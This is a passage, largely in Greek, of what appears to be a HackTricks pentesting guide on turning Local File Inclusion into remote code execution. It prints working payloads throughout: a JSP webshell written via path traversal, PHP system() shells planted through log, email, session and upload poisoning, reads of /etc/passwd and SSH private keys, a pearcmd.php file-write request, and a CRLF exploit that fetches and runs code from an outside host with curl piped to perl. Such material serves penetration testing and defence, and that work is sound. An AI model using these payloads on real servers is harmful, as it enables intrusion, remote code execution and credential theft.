- Η ευάλωτη υπηρεσία που πραγματοποιεί το write μπορεί να ακούει σε μη-HTTP port (π.χ. ένας JMF XML listener στο TCP 4004). Το κύριο web portal (σε διαφορετική θύρα) θα σερβίρει αργότερα το payload σας.
- Σε Java stacks, αυτές οι εγγραφές αρχείων συχνά υλοποιούνται με απλή `File`/`Paths` concatenation. Η έλλειψη canonicalisation/allow-listing είναι το βασικό σφάλμα.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Σκληροποίηση που εξουδετερώνει αυτή την κλάση σφαλμάτων:
- Μετατρέψτε τη διαδρομή σε κανονική μορφή και επιβάλετε ότι είναι απόγονος ενός επιτρεπόμενου (allow-listed) βασικού καταλόγου.
- Απορρίψτε οποιαδήποτε διαδρομή περιέχει `..`, απόλυτες ρίζες ή γράμματα δίσκων· προτιμήστε παραγόμενα ονόματα αρχείων.
- Τρέξτε τον writer ως λογαριασμό με χαμηλά δικαιώματα και διαχωρίστε τους καταλόγους εγγραφής από τις ρίζες που εξυπηρετούνται.

## Remote File Inclusion

Επεξηγήθηκε προηγουμένως, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Εάν ο διακομιστής Apache ή Nginx είναι **ευάλωτος σε LFI** μέσα στη συνάρτηση include, μπορείτε να δοκιμάσετε να αποκτήσετε πρόσβαση στα **`/var/log/apache2/access.log` ή `/var/log/nginx/access.log`**, να τοποθετήσετε μέσα στο **user agent** ή σε ένα **GET parameter** ένα php shell όπως **`<?php system($_GET['c']); ?>`** και να συμπεριλάβετε αυτό το αρχείο

> [!WARNING]
> Σημειώστε ότι **αν χρησιμοποιήσετε διπλά εισαγωγικά** για το shell αντί για **απλά εισαγωγικά**, τα διπλά εισαγωγικά θα μετατραπούν στη συμβολοσειρά "_**quote;**_", **η PHP θα ρίξει σφάλμα** εκεί και **τίποτε άλλο δεν θα εκτελεστεί**.
>
> Επίσης, βεβαιωθείτε ότι **γράφεται σωστά το payload** αλλιώς η PHP θα εμφανίσει σφάλμα κάθε φορά που θα προσπαθεί να φορτώσει το αρχείο καταγραφής και δεν θα έχετε δεύτερη ευκαιρία.

Αυτό μπορεί επίσης να γίνει σε άλλα logs αλλά **προσέξτε,** ο κώδικας μέσα στα logs μπορεί να είναι URL encoded και αυτό μπορεί να καταστρέψει το Shell. Το header **authorisation "basic"** περιέχει "user:password" σε Base64 και αποκωδικοποιείται μέσα στα logs. Η PHPShell μπορεί να εισαχθεί μέσα σε αυτό το header.\
Άλλες πιθανές διαδρομές αρχείων καταγραφής:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Μέσω Email

**Στείλτε ένα mail** σε έναν εσωτερικό λογαριασμό (user@localhost) που περιέχει το PHP payload σας όπως `<?php echo system($_REQUEST["cmd"]); ?>` και προσπαθήστε να include το mail του χρήστη με μια διαδρομή όπως **`/var/mail/<USERNAME>`** ή **`/var/spool/mail/<USERNAME>`**

### Μέσω /proc/\*/fd/\*

1. Ανεβάστε πολλά shells (για παράδειγμα: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), με $PID = PID της διεργασίας (μπορεί να βρεθεί με brute force) και $FD το file descriptor (επίσης μπορεί να βρεθεί με brute force)

### Μέσω /proc/self/environ

Όπως σε ένα log αρχείο, στείλτε το payload στο User-Agent, θα αντικατοπτριστεί μέσα στο αρχείο /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Μέσω μεταφόρτωσης

Αν μπορείτε να ανεβάσετε ένα αρχείο, απλά εισάγετε το shell payload σε αυτό (π.χ.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Για να διατηρηθεί το αρχείο ευανάγνωστο, είναι καλύτερο να inject στα metadata των εικόνων/doc/pdf

### Μέσω ZIP file upload

Μεταφορτώστε ένα ZIP αρχείο που περιέχει ένα συμπιεσμένο PHP shell και αποκτήστε πρόσβαση:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Μέσω PHP sessions

Ελέγξτε αν ο ιστότοπος χρησιμοποιεί PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
Στο PHP αυτές οι sessions αποθηκεύονται σε _/var/lib/php5/sess\\_\[PHPSESSID]\_ αρχεία
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Θέστε το cookie σε `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Χρησιμοποιήστε το LFI για να συμπεριλάβετε το PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Μέσω ssh

Αν το ssh είναι ενεργό έλεγξε ποιος χρήστης χρησιμοποιείται (/proc/self/status & /etc/passwd) και προσπάθησε να αποκτήσεις πρόσβαση στο **\<HOME>/.ssh/id_rsa**

### **Μέσω** **vsftpd** _**logs**_

Τα logs για τον FTP server vsftpd βρίσκονται στο _**/var/log/vsftpd.log**_. Στην περίπτωση όπου υπάρχει ευπάθεια Local File Inclusion (LFI), και είναι δυνατή η πρόσβαση σε έναν εκτεθειμένο vsftpd server, μπορούν να ληφθούν υπόψη τα ακόλουθα βήματα:

1. Εισχώρησε ένα PHP payload στο πεδίο username κατά τη διάρκεια της διαδικασίας login.
2. Μετά την έγχυση, χρησιμοποίησε την LFI για να ανακτήσεις τα logs του server από _**/var/log/vsftpd.log**_.

### Μέσω php base64 filter (χρησιμοποιώντας base64)

Όπως δείχνει σε [αυτό](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) άρθρο, PHP base64 filter απλώς αγνοεί μη-base64. Μπορείς να το χρησιμοποιήσεις για να παρακάμψεις τον έλεγχο κατάληξης αρχείου: αν παρέχεις base64 που τελειώνει με ".php", θα αγνοήσει το "." και θα προσθέσει "php" στο base64. Εδώ είναι ένα παράδειγμα payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Μέσω php filters (δεν χρειάζεται αρχείο)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) εξηγεί ότι μπορείτε να χρησιμοποιήσετε **php filters to generate arbitrary content** ως έξοδο. Το οποίο βασικά σημαίνει ότι μπορείτε να **generate arbitrary php code** for the include **without needing to write** it into a file.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Μέσω segmentation fault

**Upload** ένα αρχείο που θα αποθηκευτεί ως **temporary** στο `/tmp`, στη συνέχεια στην **same request,** προκαλέστε ένα **segmentation fault**, και τότε το **temporary file won't be deleted** και μπορείτε να το αναζητήσετε.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Μέσω Nginx temp file storage

Αν βρήκατε μια **Local File Inclusion** και το **Nginx** τρέχει μπροστά από το PHP, μπορεί να καταφέρετε να αποκτήσετε RCE με την παρακάτω τεχνική:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Μέσω PHP_SESSION_UPLOAD_PROGRESS

Αν βρήκατε μια **Local File Inclusion** ακόμη κι αν **don't have a session** και το `session.auto_start` είναι `Off`. Εάν παρέχετε το **`PHP_SESSION_UPLOAD_PROGRESS`** στα **multipart POST** δεδομένα, το PHP θα **enable the session for you**. Μπορείτε να το καταχραστείτε για να αποκτήσετε RCE:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Μέσω temp file uploads in Windows

Αν βρήκατε μια **Local File Inclusion** και ο server τρέχει σε **Windows** μπορεί να αποκτήσετε RCE:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Μέσω `pearcmd.php` + URL args

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), το script `/usr/local/lib/phppearcmd.php` υπάρχει από προεπιλογή σε php docker images. Επιπλέον, είναι δυνατό να περάσετε arguments στο script μέσω του URL επειδή υποδεικνύεται ότι αν ένα URL param δεν έχει `=`, θα πρέπει να χρησιμοποιηθεί ως argument. Δείτε επίσης [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) και [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Το παρακάτω request δημιουργεί ένα αρχείο στο `/tmp/hello.php` με το περιεχόμενο `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Το παρακάτω εκμεταλλεύεται μια CRLF vuln για να αποκτήσει RCE (από [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Μέσω phpinfo() (file_uploads = on)

Αν βρήκες μια **Local File Inclusion** και ένα αρχείο που εκθέτει **phpinfo()** με file_uploads = on μπορείς να πάρεις RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Μέσω compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Αν βρήκες μια **Local File Inclusion** και **can exfiltrate the path** του temp file ΑΛΛΑ ο **server** είναι **checking** αν το **file to be included has PHP marks**, μπορείς να δοκιμάσεις να **bypass that check** με αυτή τη **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Μέσω eternal waiting + bruteforce

Αν μπορείς να εκμεταλλευτείς το LFI για να **upload temporary files** και να κάνεις τον server να **hang** την PHP εκτέλεση, τότε μπορείς να **brute force filenames during hours** για να βρεις το temporary file:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Προς Fatal Error

Αν συμπεριλάβεις οποιοδήποτε από τα αρχεία `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Πρέπει να συμπεριλάβεις το ίδιο ένα 2 φορές για να προκαλέσεις αυτό το error).

**Δεν ξέρω πόσο χρήσιμο είναι αυτό αλλά ίσως να είναι.**\
_Ακόμα κι αν προκαλέσεις ένα PHP Fatal Error, τα PHP temporary files που ανέβηκαν διαγράφονται._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Αναφορές

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
